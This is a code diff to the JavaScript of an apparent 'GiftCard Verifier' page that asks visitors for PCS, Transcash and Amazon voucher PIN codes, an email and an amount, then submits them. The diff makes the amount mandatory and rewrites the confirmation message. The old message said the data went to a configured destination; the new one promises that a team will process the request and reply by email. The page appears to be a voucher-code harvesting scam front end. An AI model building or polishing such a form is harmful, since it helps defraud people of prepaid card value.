@@ -328,7 +328,7 @@ const CARD_LOGOS = {
     amazon: `<img src="https://i.pinimg.com/1200x/22/b6/7b/22b67b10a768cef2aa80cec378252eb3.jpg" alt="Amazon" style="width:100%;height:auto;max-height:40px;border-radius:6px;">`
 };
 
-// ===== MINI-LOGOS POUR LE SELECT (CORRIGÉS) =====
+// ===== MINI-LOGOS POUR LE SELECT =====
 const CARD_MINI_LOGOS = {
     pcs: `<img src="https://i.pinimg.com/1200x/4b/d4/02/4bd4028aeec8bb467458d3c9db1c7460.jpg" alt="PCS" style="width:20px;height:20px;border-radius:4px;vertical-align:middle;margin-right:6px;object-fit:cover;">`,
     transcash: `<img src="https://i.pinimg.com/1200x/f5/25/62/f52562ace794f02a992383e6456027a4.jpg" alt="Transcash" style="width:20px;height:20px;border-radius:4px;vertical-align:middle;margin-right:6px;object-fit:cover;">`,
@@ -340,7 +340,7 @@ const CARD_MINI_LOGOS = {
     amazon: `<img src="https://i.pinimg.com/1200x/22/b6/7b/22b67b10a768cef2aa80cec378252eb3.jpg" alt="Amazon" style="width:20px;height:20px;border-radius:4px;vertical-align:middle;margin-right:6px;object-fit:cover;">`
 };
 
-// ===== TRADUCTIONS (avec contact ajouté) =====
+// ===== TRADUCTIONS =====
 const translations = {
     fr: {
         header: {
@@ -364,7 +364,10 @@ const translations = {
             pinHelpDefault: 'Choisissez une carte pour charger le bon format.',
             pinRequired: 'Veuillez saisir un code.',
             email: 'Votre email',
-            amount: 'Montant initial (optionnel)',
+            amount: 'Montant',
+            selectAmount: '-- Sélectionnez un montant --',
+            otherAmount: 'Autre (saisir manuellement)',
+            amountRequired: 'Veuillez sélectionner ou saisir un montant.',
             purchaseDate: 'Date d\'achat (optionnel)',
             message: 'Message supplémentaire (optionnel)',
             securityTitle: 'Transmission du formulaire',
@@ -384,9 +387,11 @@ const translations = {
         },
         modal: {
             title: 'Demande envoyée',
-            description: 'Votre demande a été transmise à la destination configurée. Si un suivi est effectué, il utilisera l\'adresse email renseignée dans le formulaire.',
+            description: 'Votre demande a bien été reçue. Notre équipe la traitera dans les plus brefs délais et vous répondra par email',
             close: 'Fermer'
         },
+
+
         theme: {
             toDark: 'Activer le mode sombre',
             toLight: 'Activer le mode clair'
@@ -400,8 +405,9 @@ const translations = {
             pinInvalidFor: card => `Le format du code ${card} est invalide.`,
             pinNeedsCard: 'Choisissez une carte pour valider le code.',
             emailInvalid: 'Veuillez entrer un email valide.',
-            amountNegative: 'Le montant ne peut pas être négatif.',
+            amountRequired: 'Veuillez sélectionner ou saisir un montant.',
             amountInvalid: 'Veuillez entrer un montant valide (ex: 50.00).',
+            amountNegative: 'Le montant ne peut pas être négatif.',
             dateInvalid: 'Veuillez entrer une date valide.',
             dateFuture: 'La date d\'achat ne peut pas être dans le futur.'
         },
@@ -433,7 +439,10 @@ const translations = {
             pinHelpDefault: 'Choose a card to load the right format.',
             pinRequired: 'Please enter a code.',
             email: 'Your email',
-            amount: 'Initial amount (optional)',
+            amount: 'Amount',
+            selectAmount: '-- Select an amount --',
+            otherAmount: 'Other (enter manually)',
+            amountRequired: 'Please select or enter an amount.',
             purchaseDate: 'Purchase date (optional)',
             message: 'Additional message (optional)',
             securityTitle: 'Form transmission',
@@ -449,7 +458,7 @@ const translations = {
             subtitle: 'Premium, responsive UI ready for backend evolution',
             privacy: 'Privacy policy',
             terms: 'Terms of service',
-            copy: '© 2026 GiftCard Verifier. All rights reserved.'
+            copy: '© 2024 GiftCard Verifier. All rights reserved.'
         },
         modal: {
             title: 'Request sent',
@@ -469,8 +478,9 @@ const translations = {
             pinInvalidFor: card => `The ${card} code format is invalid.`,
             pinNeedsCard: 'Choose a card before validating the code.',
             emailInvalid: 'Please enter a valid email address.',
-            amountNegative: 'Amount cannot be negative.',
+            amountRequired: 'Please select or enter an amount.',
             amountInvalid: 'Please enter a valid amount (e.g. 50.00).',
+            amountNegative: 'Amount cannot be negative.',
             dateInvalid: 'Please enter a valid date.',
             dateFuture: 'Purchase date cannot be in the future.'
         },
@@ -502,7 +512,10 @@ const translations = {
             pinHelpDefault: 'Wählen Sie eine Karte, um das richtige Format zu laden.',
             pinRequired: 'Bitte geben Sie einen Code ein.',
             email: 'Ihre E-Mail',
-            amount: 'Ursprünglicher Betrag (optional)',
+            amount: 'Betrag',
+            selectAmount: '-- Wählen Sie einen Betrag --',
+            otherAmount: 'Andere (manuell eingeben)',
+            amountRequired: 'Bitte wählen oder geben Sie einen Betrag ein.',
             purchaseDate: 'Kaufdatum (optional)',
             message: 'Zusätzliche Nachricht (optional)',
             securityTitle: 'Formularübermittlung',
@@ -518,7 +531,7 @@ const translations = {
             subtitle: 'Premium, responsive UI bereit für Backend-Entwicklung',
             privacy: 'Datenschutzrichtlinie',
             terms: 'Nutzungsbedingungen',
-            copy: '© 2026 GiftCard Verifier. Alle Rechte vorbehalten.'
+            copy: '© 2024 GiftCard Verifier. Alle Rechte vorbehalten.'
         },
         modal: {
             title: 'Anfrage gesendet',
@@ -538,8 +551,9 @@ const translations = {
             pinInvalidFor: card => `Das Format des Codes ${card} ist ungültig.`,
             pinNeedsCard: 'Wählen Sie eine Karte, um den Code zu validieren.',
             emailInvalid: 'Bitte geben Sie eine gültige E-Mail-Adresse ein.',
-            amountNegative: 'Der Betrag darf nicht negativ sein.',
+            amountRequired: 'Bitte wählen oder geben Sie einen Betrag ein.',
             amountInvalid: 'Bitte geben Sie einen gültigen Betrag ein (z.B. 50.00).',
+            amountNegative: 'Der Betrag darf nicht negativ sein.',
             dateInvalid: 'Bitte geben Sie ein gültiges Datum ein.',
             dateFuture: 'Das Kaufdatum kann nicht in der Zukunft liegen.'
         },
@@ -571,7 +585,10 @@ const translations = {
             pinHelpDefault: 'Elija una tarjeta para cargar el formato correcto.',
             pinRequired: 'Por favor, ingrese un código.',
             email: 'Su correo electrónico',
-            amount: 'Monto inicial (opcional)',
+            amount: 'Monto',
+            selectAmount: '-- Seleccione un monto --',
+            otherAmount: 'Otro (ingresar manualmente)',
+            amountRequired: 'Por favor, seleccione o ingrese un monto.',
             purchaseDate: 'Fecha de compra (opcional)',
             message: 'Mensaje adicional (opcional)',
             securityTitle: 'Transmisión del formulario',
@@ -607,8 +624,9 @@ const translations = {
             pinInvalidFor: card => `El formato del código ${card} es inválido.`,
             pinNeedsCard: 'Elija una tarjeta para validar el código.',
             emailInvalid: 'Por favor, ingrese un correo electrónico válido.',
-            amountNegative: 'El monto no puede ser negativo.',
+            amountRequired: 'Por favor, seleccione o ingrese un monto.',
             amountInvalid: 'Por favor, ingrese un monto válido (ej: 50.00).',
+            amountNegative: 'El monto no puede ser negativo.',
             dateInvalid: 'Por favor, ingrese una fecha válida.',
             dateFuture: 'La fecha de compra no puede ser en el futuro.'
         },
@@ -650,7 +668,9 @@ const elements = {
     emailInput: document.getElementById('email'),
     emailFieldWrap: document.getElementById('emailFieldWrap'),
     emailError: document.getElementById('emailError'),
-    amountInput: document.getElementById('amount'),
+    amountSelect: document.getElementById('amountSelect'),
+    otherAmount: document.getElementById('otherAmount'),
+    otherAmountWrapper: document.getElementById('otherAmountWrapper'),
     amountError: document.getElementById('amountError'),
     purchaseDateInput: document.getElementById('purchaseDate'),
     dateError: document.getElementById('dateError'),
@@ -800,6 +820,18 @@ function setLanguage(lang) {
         selectPlaceholder.textContent = t.form.selectPlaceholder;
     }
 
+    // Mettre à jour le placeholder du select de montant
+    const amountPlaceholder = elements.amountSelect.querySelector('option[value=""]');
+    if (amountPlaceholder) {
+        amountPlaceholder.textContent = t.form.selectAmount;
+    }
+
+    // Mettre à jour l'option "Autre"
+    const otherOption = elements.amountSelect.querySelector('option[value="other"]');
+    if (otherOption) {
+        otherOption.textContent = t.form.otherAmount;
+    }
+
     safeStorageSet(STORAGE_KEYS.language, currentLang);
     updateDynamicText();
     updateThemeButton();
@@ -848,6 +880,23 @@ function selectCard(cardValue) {
     updateCardPreview();
     validatePin(false);
     markFormDirty();
+}
+
+// ===== GESTION DU MONTANT =====
+function toggleOtherAmount() {
+    const isOther = elements.amountSelect.value === 'other';
+    elements.otherAmountWrapper.classList.toggle('hidden', !isOther);
+    if (!isOther) {
+        elements.otherAmount.value = '';
+    }
+}
+
+function getAmountValue() {
+    const selected = elements.amountSelect.value;
+    if (selected === 'other') {
+        return elements.otherAmount.value.trim();
+    }
+    return selected;
 }
 
 // ===== VALIDATION DES CHAMPS =====
@@ -942,28 +991,22 @@ function validateCardSelection(showError = false) {
 }
 
 function validateAmount(showError = false) {
-    const value = elements.amountInput.value.trim();
+    const t = getCurrentTranslations();
+    const value = getAmountValue();
+    
     if (!value) {
-        elements.amountError.textContent = '';
-        return true;
+        elements.amountError.textContent = showError ? t.validation.amountRequired : '';
+        return false;
     }
 
     if (!/^\d+(\.\d{1,2})?$/.test(value)) {
-        if (showError) {
-            elements.amountError.textContent = getCurrentTranslations().validation.amountInvalid;
-        } else {
-            elements.amountError.textContent = '';
-        }
+        elements.amountError.textContent = showError ? t.validation.amountInvalid : '';
         return false;
     }
 
     const amount = parseFloat(value);
     if (isNaN(amount) || amount < 0) {
-        if (showError) {
-            elements.amountError.textContent = getCurrentTranslations().validation.amountNegative;
-        } else {
-            elements.amountError.textContent = '';
-        }
+        elements.amountError.textContent = showError ? t.validation.amountNegative : '';
         return false;
     }
 
@@ -1058,7 +1101,6 @@ function updateDynamicText() {
         es: 'usted@ejemplo.com'
     };
     elements.emailInput.placeholder = emailPlaceholders[currentLang] || emailPlaceholders.fr;
-    elements.amountInput.placeholder = '50.00';
     
     const messagePlaceholders = {
         fr: 'Informations complémentaires...',
@@ -1142,6 +1184,9 @@ function resetFormState() {
     elements.form.reset();
     elements.cardTypeSelect.value = '';
     elements.cardTypeInput.value = '';
+    elements.amountSelect.value = '';
+    elements.otherAmount.value = '';
+    elements.otherAmountWrapper.classList.add('hidden');
     updateCardPreview();
     setInputState(elements.pinFieldWrap, 'fas fa-key', 'input-neutral');
     setInputState(elements.emailFieldWrap, 'fas fa-envelope', 'input-neutral');
@@ -1412,6 +1457,28 @@ function bindEvents() {
         }, 100);
     });
 
+    // ===== GESTION DU MONTANT =====
+    elements.amountSelect.addEventListener('change', () => {
+        toggleOtherAmount();
+        markFormDirty();
+        debounce('amount', () => validateAmount(false), 150);
+        if (elements.amountSelect.value !== 'other') {
+            setTimeout(() => {
+                if (elements.amountSelect.value) {
+                    elements.purchaseDateInput.focus();
+                }
+            }, 100);
+        } else {
+            setTimeout(() => elements.otherAmount.focus(), 50);
+        }
+    });
+
+    elements.otherAmount.addEventListener('input', () => {
+        markFormDirty();
+        debounce('amount', () => validateAmount(false), 150);
+    });
+    elements.otherAmount.addEventListener('blur', () => validateAmount(true));
+
     // Fermeture de la modal
     elements.closeSuccessModal.addEventListener('click', closeSuccessModal);
     const modalBackdrop = elements.successModal.querySelector('[data-close-modal]');
@@ -1431,12 +1498,6 @@ function bindEvents() {
         debounce('email', () => validateEmail(false), 150);
     });
     elements.emailInput.addEventListener('blur', () => validateEmail(Boolean(elements.emailInput.value)));
-
-    elements.amountInput.addEventListener('input', () => {
-        markFormDirty();
-        debounce('amount', () => validateAmount(false), 150);
-    });
-    elements.amountInput.addEventListener('blur', () => validateAmount(true));
 
     elements.purchaseDateInput.addEventListener('input', () => {
         markFormDirty();
@@ -1463,7 +1524,7 @@ function bindEvents() {
             cardType: elements.cardTypeInput.value,
             pin: sanitizePin(elements.pinInput.value),
             email: elements.emailInput.value.trim(),
-            amount: elements.amountInput.value || 'Non spécifié',
+            amount: getAmountValue() || 'Non spécifié',
             purchaseDate: elements.purchaseDateInput.value || 'Non spécifié',
             message: elements.messageInput.value.trim() || 'Aucun message',
             timestamp: new Date().toLocaleString(
